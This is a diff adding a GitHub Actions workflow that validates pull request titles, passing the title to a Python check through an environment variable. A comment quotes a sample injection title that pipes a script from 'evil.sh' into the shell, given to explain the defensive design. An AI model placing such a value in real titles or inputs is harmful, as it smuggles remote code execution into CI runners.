@@ -1,0 +1,34 @@
+# Checks the PR title on its own, in a separate workflow, because it must also re-run when
+# someone EDITS the title. Putting "edited" in ci.yml would rebuild everything on every title tweak.
+name: PR title
+
+on:
+  pull_request:
+    branches: [main]
+    types: [opened, edited, reopened, synchronize]
+
+permissions:
+  contents: read
+
+concurrency:
+  group: pr-title-${{ github.event.pull_request.number }}
+  cancel-in-progress: true
+
+jobs:
+  pr-title:
+    name: PR title
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    steps:
+      - uses: actions/checkout@v6
+
+      - uses: actions/setup-python@v6
+        with:
+          python-version: "3.13"
+
+      # The title goes in through an env var, never as ${{ ... }} inside `run:`. A title like
+      # `"; curl evil.sh | sh; "` would otherwise be pasted straight into the shell script.
+      - name: Title must start with TEST-<number>
+        env:
+          PR_TITLE: ${{ github.event.pull_request.title }}
+        run: python -m tools.pr_title "$PR_TITLE"
